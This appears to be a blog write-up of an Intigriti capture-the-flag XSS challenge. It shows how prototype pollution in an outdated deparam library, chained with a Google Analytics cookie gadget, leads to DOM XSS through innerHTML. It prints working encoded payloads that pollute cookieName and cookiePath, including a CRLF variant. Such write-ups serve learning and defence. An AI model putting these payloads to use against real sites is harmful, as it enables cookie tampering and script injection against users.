---
layout: single_c
title:  "Initigriti XSS Challenge"
date:   2018-12-27 10:43:16 +0530
toc: true
categories: Web
tags: XSS
classes: wide
---
## Description:
The challenge is to find an XSS vulnerability on https://challenge-0821.intigriti.io. This was a guest challenge created by https://twitter.com/WHOISbinit!


Let's dive in and see if we can trigger an xss


## Analysis

![image1]({{ site.url }}{{ site.baseurl }}/assets/images/xss/1.png){: .align-center}

The page contains a welcome message a a bunch of links inside an `iframe` that point to `cooking.html`, which on being clicked changes the page a bit with additional stuff being added. The links contain some base64 data at the end.


```
https://challenge-0821.intigriti.io/challenge/cooking.html?recipe=dGl0bGU9VGhlJTIwYmFzaWMlMjBYU1MmaW5ncmVkaWVudHMlNUIlNUQ9QSUyMHNjcmlwdCUyMHRhZyZpbmdyZWRpZW50cyU1QiU1RD1Tb21lJTIwamF2YXNjcmlwdCZwYXlsb2FkPSUzQ3NjcmlwdCUzRWFsZXJ0KDEpJTNDL3NjcmlwdCUzRSZzdGVwcyU1QiU1RD1GaW5kJTIwdGFyZ2V0JnN0ZXBzJTVCJTVEPUluamVjdCZzdGVwcyU1QiU1RD1FbmpveQ==
```

Decoded
```
https://challenge-0821.intigriti.io/challenge/cooking.html?recipe=title=The%20basic%20XSS&ingredients%5B%5D=A%20script%20tag&ingredients%5B%5D=Some%20javascript&payload=%3Cscript%3Ealert(1)%3C/script%3E&steps%5B%5D=Find%20target&steps%5B%5D=Inject&steps%5B%5D=Enjoy
```

The title contains the data that is populated in the page. Everything points at DOM XSS as the base64 data seems to be processed on client side. Let's look at the source to find how the values are being injected. 

![image1]({{ site.url }}{{ site.baseurl }}/assets/images/xss/main_js.png){: .align-center}

There is a file named `main.js` that seems to be doing all the heavy lifting. Here is the break down of what it does. 

```js
// This thing is called after the page loaded or something. Not too sure...
const handleLoad = () => {
    let username = readCookie('username');
    if (!username) {
        document.cookie = `username=unknownUser${Math.floor(Math.random() * (1000 + 1))};path=/`;
    }

    let recipe = deparam(atob(new URL(location.href).searchParams.get('recipe')));

    ga('create', 'ga_r33l', 'auto');

    welcomeUser(readCookie('username'));
    generateRecipeText(recipe);
    console.log(recipe)
}

window.addEventListener("load", handleLoad);
```
1. When the page loads, the script check for a cookie named `username` and creates one if it doesn't exist. The cookie value of the format `unknownUser` + a random number. 

2. Take the base64 encoded string, decodes it and separates it into parameters.

3. Call `ga()` function which is an initializer of google analytics code.

4. Injects the username into the page

5. Sets the values of recipes according to the values in base64 encoded string. 

## Vulnerability

```js
function welcomeUser(username) {
    let welcomeMessage = document.querySelector("#welcome");
    welcomeMessage.innerHTML = `Welcome ${username}`;
}
```

The script mainly used `.innerText` to set the values throughout the script with an exception for username, which is set using `innetHTML`. `.innerText` can mitigate xss if used properly and that seems to be the case here. The only way to gain xss is by changing the value of username. 

```js
// As we are a professional company offering XSS recipes, we want to create a nice user experience where the user can have a cool name that is shown on the screen
// Our advisors say that it should be editable through the webinterface but I think our users are smart enough to just edit it in the cookies.
// This way no XSS will ever be possible because you cannot change the cookie unless you do it yourself!

```

## Analysis

And as written in comments the user has no control over the value of the cookie as it is set to specific string. Once we control the value of the cookie, xss should be trivial.

After looking around for almost a day, I couldn't really find any way to control the value of the cookie. I was stuck and intigriti dropped the first tip on discord. 

```
TIP 1: The Google Analytics script was not just included for tracking all of you, it may or may not contain some useful gadget!
```

Hmm so the xss seems to be somehow related to google anlytics. Another day of searching and fiddling about gave nothing useful. I just took a break and got busy with work. A few days later the second hint dropped. 

```
TIP 2: Wait, you're telling me that deparam script hasn't been updated in 5 years? That can't be good!
```

Okay that seems to be a bit more interesting. I searched for `deparam` vulnerabilities and got a hit.

![image1]({{ site.url }}{{ site.baseurl }}/assets/images/xss/deparam.png){: .align-center}

`deparam` has a `Prototype Pollution` vulnerability and this was the first time I have heard about such a thing. So more searching later, I found [this](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/) really good article that explains it in detail. 

> Every object in JavaScript has a prototype (it can also be null). If we don’t specify it, by default the prototype for an object is Object.prototype.In a nutshell, when we try to access a property of an object, JS engine first checks if the object itself contains the property. If it does, then it is returned. Otherwise, JS checks if the prototype has the property. If it doesn’t, JS checks the prototype of the prototype… and so on, until the prototype is null.

Prototype pollution can cause some interesting behavior depending on how the code is written. 

For example consider the following code
```js
const user = { userid: 123 };
if (user.admin) {
    console.log('You are an admin');
}
```

Here the code checks if the `user` has a parameter called `admin`. It is possible to bypass this by polluting the prototype and adding an `admin` parameter like this.

```js
Object.prototype.admin = true;
```

So back to out challenge, we now have a prototype pollution and we need to figure out a way to set the cookie using this. Looking at the first tip again and after some searching on the web, I found out that google anaytics has a cookie injection due to prototype pollution. The PoC can be found [here](https://github.com/BlackFan/client-side-prototype-pollution/blob/master/gadgets/google-analytics.md#google-analytics).

```js
?__proto__[cookieName]=COOKIE%3DInjection%3B
```

## Exploit
Okay that is awesome as that is exactly what we need. To test it out, we can base64 encode the payload and pass it to the page.

```js
btoa("__proto__[cookieName]=COOKIE%3DInjection%3B")

"X19wcm90b19fW2Nvb2tpZU5hbWVdPUNPT0tJRSUzREluamVjdGlvbiUzQg=="
```

![image1]({{ site.url }}{{ site.baseurl }}/assets/images/xss/cookie_try.png){: .align-center}

Although the script threw some errors (cause we did not include the full payload) the cookie has been successfully injected. Let's look back at the `readCookie` function to figure out how to exploit this.

```js
function readCookie(name) {
    let nameEQ = name + "=";
    let ca = document.cookie.split(';');
    for (let i=0; i < ca.length; i++) {
        let c = ca[i];
        while (c.charAt(0)===' ') c = c.substring(1,c.length);
        if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length,c.length);
    }
    return null;
}
welcomeUser(readCookie('username'));
```

1. The function accepts a parameter `name` which is set as `username` by the `main.js` script. It create a variable `nameEQ` that contains the value `username=`.
2. It takes the value of the first cookie `document.cookie` by split it at `;`.
3. Removes any starting whitespace and returns the value of the cookie which is then later set using `.innerHTML`.

Looking at the code, there are two ways we can solve this. 

### a. The \r\n unintended solution
Insert a cookie named `username` in a way that `document.cookie` returns our value first followed by the actual `username` cookie.

I started playing around with cookies to understand how the order of `document.cookies` is determined. The domain is looked at first and the cookie with same domain as the current domain comes first. If domains are same then the path is looked at next. The one with a path values is returned first.

![image1]({{ site.url }}{{ site.baseurl }}/assets/images/xss/cookie_order.png){: .align-center}

In this example the cookie with value `mycookie1` comes first as it has the same domain as the `username` cookie set by the `main.js` script.

I started trying different ways to set the path. The first attempt was to modify the pollution payload by adding the `path` variable. 

```js
btoa("__proto__[cookieName]=username%3DInjection%3Bpath=/value")

"X19wcm90b19fW2Nvb2tpZU5hbWVdPXVzZXJuYW1lJTNESW5qZWN0aW9uJTNCcGF0aD0vdmFsdWU="
```

That failed miserably as everything after the `;` (%3B) got ignored. We can't change the cookie path this way.After spending quite some time trying different encoding and alternatives of `;`. Someone in discord suggested reading the [cookie RFC 6265](https://datatracker.ietf.org/doc/html/rfc6265) and I saw something related to using `CRLF` (\r\n) for cookie folding. I was not really sure what it does but thought I will try using that instead of `;`.

![image1]({{ site.url }}{{ site.baseurl }}/assets/images/xss/a_order.png){: .align-center}

And for some reason that I did not understand, the cookie path was set to `/challenge` and the we have successfully changed the `document.cookie` order. Now all we have to do it change the cookie payload. So the final payload was

```js
btoa("__proto__[cookieName]=username%3d<img%20src%3d'x'%20onerror%3dalert(document.domain)>\r\n%3b")

"X19wcm90b19fW2Nvb2tpZU5hbWVdPXVzZXJuYW1lJTNkPGltZyUyMHNyYyUzZCd4JyUyMG9uZXJyb3IlM2RhbGVydChkb2N1bWVudC5kb21haW4pPg0KJTNi"
```

![image1]({{ site.url }}{{ site.baseurl }}/assets/images/xss/a_popup.png){: .align-center}

And we get a pop up with the domain name.


### b. The intended solution
After discussing with someone else who suggested looking at the ga code I saw the following

```js
 , Ad = S("userId", "uid")
      , Na = T("trackingId", "tid")
      , U = T("cookieName", void 0, "_ga")
      , W = T("cookieDomain")
      , Yb = T("cookiePath", void 0, "/")
      , Zb = T("cookieExpires", void 0, 63072E3)
      , Hd = T("cookieUpdate", void 0, !0)
      , Be = T("cookieFlags", void 0, "")
```

There seems to be parameters other than `cookieName` such as `cookiePath`, which we might be able to control using prototype pollution. Lets try crafting another payload with path as `/challenge` to change the document.cookie order.

```js
btoa("__proto__[cookieName]=username%3d<img%20src%3d'x'%20onerror%3dalert(document.domain)>%3b&__proto__[cookiePath]=/challenge%3b")
"X19wcm90b19fW2Nvb2tpZU5hbWVdPXVzZXJuYW1lJTNkPGltZyUyMHNyYyUzZCd4JyUyMG9uZXJyb3IlM2RhbGVydChkb2N1bWVudC5kb21haW4pPiUzYiZfX3Byb3RvX19bY29va2llUGF0aF09L2NoYWxsZW5nZSUzYg=="
```

![image1]({{ site.url }}{{ site.baseurl }}/assets/images/xss/b_popup.png){: .align-center}


And that works too.


